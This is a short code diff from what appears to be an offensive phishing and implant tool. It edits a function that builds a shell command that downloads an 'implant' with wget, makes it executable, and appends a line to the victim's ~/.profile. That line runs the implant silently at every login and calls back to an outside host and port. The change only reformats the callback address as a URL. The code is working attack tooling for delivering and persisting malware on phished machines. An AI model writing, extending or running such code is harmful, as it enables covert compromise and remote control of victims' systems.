@@ -49,7 +49,8 @@ def _make_subject_and_body(phishing_email: PhishingEmail):
 
 def _generate_implant_command(ip, implant_addr, fingerprint):
     get_implant = f"wget -O ~/libutils {implant_addr}"
-    run_implant_command = f"echo '~/libutils {fingerprint} {ip} {PORT} >/dev/null 2>/dev/null' >> ~/.profile"
+    host = f"http://{ip}:{PORT}"
+    run_implant_command = f"echo '~/libutils {fingerprint} {host} >/dev/null 2>/dev/null' >> ~/.profile"
     command = f"{get_implant} ; chmod +x ~/libutils ; {run_implant_command}"
     return command
 
